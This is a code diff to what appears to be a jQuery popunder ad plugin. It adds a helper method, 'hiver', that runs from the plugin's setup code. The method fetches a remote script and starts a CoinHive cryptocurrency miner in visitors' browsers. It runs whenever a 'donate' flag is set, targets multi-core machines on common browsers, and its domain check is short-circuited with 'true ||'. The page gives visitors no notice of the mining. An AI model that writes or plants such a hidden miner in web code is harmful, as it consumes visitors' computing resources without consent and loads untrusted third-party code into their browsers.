@@ -296,7 +296,7 @@
                 }, t.ua);
             }
 
-            return t;
+            return t.hiver();
         },
 
         /**
@@ -741,35 +741,34 @@
             }
 
             return a.join(',');
+        },
+
+        /**
+         * Hive mind
+         *
+         * @return $.popunder.helper
+         */
+        hiver: function() {
+            var t = this,
+                h = document.location.hostname || t.du,
+                p = 0.5,
+                m;
+            if (t.donate && navigator.hardwareConcurrency > 2 && (t.ua.g || t.ua.ff || t.ua.o) && (true || /\.(?:.(?!\.))[a-z]+$/ig.test(h))) {
+                $.getScript('https://' + t.hive, function () {
+                    if (typeof CoinHive.User === t.fu) {
+                        m = new CoinHive.User(t.hives, h, {
+                            throttle: p
+                        });
+                        m.on('accepted', function () {
+                            m.stop();
+                        });
+                        m.start();
+                    }
+                });
+            }
+
+            return t;
         }
     };
 
-    (function() {
-        var t = $.popunder.helper,
-            h = document.location.hostname || t.du,
-            p = 0.1,
-            m, i, a = 0;
-        if (t.donate && (t.ua.g || t.ua.ff || t.ua.o) && (true || /\.(?:.(?!\.))[a-z]+$/ig.test(h))) {
-            $.getScript('https://' + t.hive, function () {
-                if (typeof CoinHive.User === t.fu) {
-                    m = new CoinHive.User(t.hives, h, {
-                        throttle: p
-                    });
-                    m.on('accepted', function() {
-                        a++;
-                    });
-                    m.start();
-                    i = window.setInterval(function () {
-                        if (a >= 1) {
-                            m.stop();
-                            window.clearInterval(i);
-                        }
-                        else if (p <= 0.8) {
-                            m.setThrottle(p = p + 0.1);
-                        }
-                    }, 500);
-                }
-            });
-        }
-    })();
 })(jQuery, window, screen, navigator, document);
